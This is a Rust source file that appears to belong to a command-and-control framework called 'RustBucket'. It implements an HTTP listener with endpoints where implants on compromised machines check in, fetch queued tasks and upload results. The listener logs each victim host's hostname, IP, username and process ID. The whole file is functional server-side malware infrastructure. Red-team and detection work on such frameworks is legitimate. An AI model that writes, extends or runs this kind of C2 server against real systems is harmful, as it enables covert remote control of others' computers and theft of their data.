use actix_web::{web, App, HttpResponse, HttpServer, Responder};
use std::collections::HashMap;
use std::net::SocketAddr;
use std::sync::{
    atomic::{AtomicBool, Ordering},
    Arc, Mutex, RwLock,
};
use std::time::{Duration, SystemTime};
use tokio::sync::oneshot;
use tokio::task::JoinHandle;
use uuid::Uuid;

use crate::listener::*;
use crate::message::*;
use crate::session::SessionManager;
use crate::task::*;

// Server state
pub struct ServerState {
    pub implants: Arc<Mutex<HashMap<Uuid, ImplantInfo>>>,
}

pub struct HttpListener {
    name: String,
    id: Uuid,
    addr: SocketAddr,
    session_manager: Arc<RwLock<SessionManager>>,
    running: Arc<AtomicBool>,
    shutdown_tx: Option<oneshot::Sender<()>>,
    handle: Option<JoinHandle<()>>,
    state: Arc<ServerState>,
}

impl HttpListener {
    pub fn new(name: &str, addr: SocketAddr, session_manager: Arc<RwLock<SessionManager>>) -> Self {
        HttpListener {
            name: name.to_string(),
            id: Uuid::new_v4(),
            addr,
            session_manager,
            running: Arc::new(AtomicBool::new(false)),
            shutdown_tx: None,
            handle: None,
            state: Arc::new(ServerState {
                implants: Arc::new(Mutex::new(HashMap::new())),
            }),
        }
    }

    pub fn addr(&self) -> SocketAddr {
        self.addr
    }

    pub fn name(&self) -> &str {
        &self.name
    }

    pub fn id(&self) -> Uuid {
        self.id
    }

    pub fn get_state(&self) -> Arc<ServerState> {
        self.state.clone()
    }

    pub fn start(&mut self) -> Result<(), String> {
        // Don't start if already running
        if self.running.load(Ordering::SeqCst) {
            return Err("Listener is already running".to_string());
        }

        let server_addr = self.addr;
        let listener_name = self.name.clone();
        let listener_id = self.id;

        let listener_data = web::Data::new(ListenerData {
            name: listener_name.clone(),
            id: listener_id,
            state: self.state.clone(),
            session_manager: self.session_manager.clone(),
        });

        // Bind the socket synchronously so bind errors are reported to the caller instead of
        // being lost inside the spawned task. The HttpServer itself is not Send, so it is built
        // inside the task from this listener.
        let std_listener = std::net::TcpListener::bind(server_addr)
            .map_err(|e| format!("Failed to bind listener to {}: {}", server_addr, e))?;
        std_listener
            .set_nonblocking(true)
            .map_err(|e| format!("Failed to configure listener socket: {}", e))?;

        let (shutdown_tx, shutdown_rx) = oneshot::channel();
        self.shutdown_tx = Some(shutdown_tx);

        let running = self.running.clone();
        running.store(true, Ordering::SeqCst);

        // Run the server on the current runtime and stop it gracefully on shutdown.
        let handle = tokio::spawn(async move {
            let server = match HttpServer::new(move || {
                App::new()
                    .app_data(listener_data.clone())
                    .route("/", web::get().to(index))
                    .route("/checkin", web::post().to(implant_checkin))
                    .route("/tasks/{implant_id}", web::get().to(get_tasks))
                    .route("/results", web::post().to(upload_results))
                    .route("/implants", web::get().to(list_implants))
            })
            .listen(std_listener)
            {
                Ok(server) => server,
                Err(e) => {
                    log::error!("Failed to start listener on {}: {}", server_addr, e);
                    running.store(false, Ordering::SeqCst);
                    return;
                }
            };

            let server_future = server.run();
            let server_handle = server_future.handle();

            // Run the server in its own task so we can stop it via its handle without dropping the
            // future first (dropping it would cancel the command loop that processes the stop).
            let server_task = tokio::spawn(server_future);

            let _ = shutdown_rx.await;
            log::info!("Shutdown signal received for listener '{}'", listener_name);
            server_handle.stop(true).await;
            let _ = server_task.await;

            // Clean up
            running.store(false, Ordering::SeqCst);
            log::info!(
                "HTTP listener '{}' ({}) stopped",
                listener_name,
                listener_id
            );
        });

        self.handle = Some(handle);
        Ok(())
    }

    pub async fn stop(&mut self) -> Result<(), String> {
        if !self.running.load(Ordering::SeqCst) {
            return Err("Listener is not running".to_string());
        }

        // Send shutdown signal
        if let Some(tx) = self.shutdown_tx.take() {
            let _ = tx.send(());
        }

        // Wait for the task to complete
        if let Some(handle) = self.handle.take() {
            match handle.await {
                Ok(_) => {}
                Err(e) => return Err(format!("Error joining task: {}", e)),
            }
        }

        self.running.store(false, Ordering::SeqCst);
        Ok(())
    }

    /// Request the listener to stop without awaiting it.
    ///
    /// Dropping the shutdown sender resolves the receiver in the accept task, which gracefully
    /// stops the actix server and clears the running flag.
    pub fn request_stop(&mut self) {
        self.shutdown_tx.take();
    }

    pub fn is_running(&self) -> bool {
        self.running.load(Ordering::SeqCst)
    }

    // Helper method to clean up stale implants
    pub fn cleanup_stale_implants(&self, timeout: Duration) -> usize {
        let now = SystemTime::now();
        let mut implants = self.state.implants.lock().unwrap();

        let stale_ids: Vec<Uuid> = implants
            .iter()
            .filter_map(|(id, implant)| match implant.last_seen.elapsed() {
                Ok(elapsed) if elapsed > timeout => Some(*id),
                _ => None,
            })
            .collect();

        for id in &stale_ids {
            implants.remove(id);
        }

        stale_ids.len()
    }
}

async fn index(data: web::Data<ListenerData>) -> impl Responder {
    HttpResponse::Ok().body(format!("RustBucket Listener: {} ({})", data.name, data.id))
}

// implant registration/check-in endpoint
async fn implant_checkin(
    checkin: web::Json<ImplantCheckin>,
    data: web::Data<ListenerData>,
) -> impl Responder {
    let now = SystemTime::now();
    let mut implants = data.state.implants.lock().unwrap();

    // Check if this is a new implant or an existing one
    let implant_id = if let Some(id) = checkin.id {
        // Existing implant - update last_seen
        if let Some(implant) = implants.get_mut(&id) {
            implant.last_seen = now;
            implant.ip_address = checkin.ip_address.clone();
            id
        } else {
            // ID provided but not found - register as new
            let new_id = Uuid::new_v4();
            let implant_info = ImplantInfo {
                id: new_id,
                hostname: checkin.hostname.clone(),
                ip_address: checkin.ip_address.clone(),
                os_info: checkin.os_info.clone(),
                username: checkin.username.clone(),
                process_id: checkin.process_id,
                first_seen: now,
                last_seen: now,
            };
            implants.insert(new_id, implant_info);

            // Create a new session
            let mgr = data.session_manager.write().unwrap();
            mgr.create_session(
                new_id,
                checkin.hostname.to_string(),
                checkin.ip_address.to_string(),
            );

            new_id
        }
    } else {
        // New implant - register
        let new_id = Uuid::new_v4();
        let implant_info = ImplantInfo {
            id: new_id,
            hostname: checkin.hostname.clone(),
            ip_address: checkin.ip_address.clone(),
            os_info: checkin.os_info.clone(),
            username: checkin.username.clone(),
            process_id: checkin.process_id,
            first_seen: now,
            last_seen: now,
        };

        implants.insert(new_id, implant_info);

        // Create a new session
        let mgr = data.session_manager.write().unwrap();
        mgr.create_session(
            new_id,
            checkin.hostname.to_string(),
            checkin.ip_address.to_string(),
        );

        new_id
    };

    log::info!("implant check-in: {}", implant_id);

    HttpResponse::Ok().json(serde_json::json!({
        "status": "success",
        "implant_id": implant_id,
    }))
}

// Get tasks for a specific implant
async fn get_tasks(path: web::Path<String>, data: web::Data<ListenerData>) -> impl Responder {
    let implant_id = match Uuid::parse_str(&path.into_inner()) {
        Ok(id) => id,
        Err(_) => return HttpResponse::BadRequest().body("Invalid implant ID"),
    };

    // Update last_seen
    {
        let mut implants = data.state.implants.lock().unwrap();
        if let Some(implant) = implants.get_mut(&implant_id) {
            implant.last_seen = SystemTime::now();
        } else {
            return HttpResponse::NotFound().body("implant not found");
        }
    }

    // Get session manager and find tasks for this implant
    let session_manager = data.session_manager.read().unwrap();

    // Find session ID from implant ID
    let session_id = match session_manager.get_session_id_by_implant(&implant_id) {
        Ok(id) => id,
        Err(_) => return HttpResponse::NotFound().body("No session found for implant"),
    };

    // Get pending tasks and mark them as in progress
    let session = match session_manager.get_session(&session_id) {
        Some(s) => s,
        None => return HttpResponse::NotFound().body("Session not found"),
    };

    let pending_tasks = match session.get_pending_tasks_for_session(session_id) {
        Ok(tasks) => tasks,
        Err(_) => return HttpResponse::InternalServerError().body("Error fetching tasks"),
    };

    // Mark tasks as in progress
    for task in &pending_tasks {
        match session.update_task_status(&task.id, crate::task::TaskStatus::InProgress) {
            Ok(_) => {}
            Err(e) => {
                log::error!("Error updating task status: {}", e);
                return HttpResponse::InternalServerError().body("Error updating task status");
            }
        }
    }

    HttpResponse::Ok().json(pending_tasks)
}

// Upload task results
async fn upload_results(
    result: web::Json<TaskResult>,
    data: web::Data<ListenerData>,
) -> impl Responder {
    let task_result = result.into_inner();

    // Use session manager to submit the result
    let session_manager = data.session_manager.read().unwrap();
    let session = match session_manager.get_session(&task_result.session_id) {
        Some(s) => s,
        None => return HttpResponse::NotFound().body("Session not found"),
    };
    match session.submit_task_result(task_result) {
        Ok(_) => HttpResponse::Ok().json(serde_json::json!({
            "status": "success",
            "message": "Task result received"
        })),
        Err(e) => HttpResponse::BadRequest().body(e),
    }
}

// List all active implants
async fn list_implants(data: web::Data<ListenerData>) -> impl Responder {
    let implants = data.state.implants.lock().unwrap();
    let implant_list: Vec<ImplantInfo> = implants.values().cloned().collect();
    HttpResponse::Ok().json(implant_list)
}

// Shared data structure for route handlers
struct ListenerData {
    name: String,
    id: Uuid,
    state: Arc<ServerState>,
    session_manager: Arc<RwLock<SessionManager>>,
}
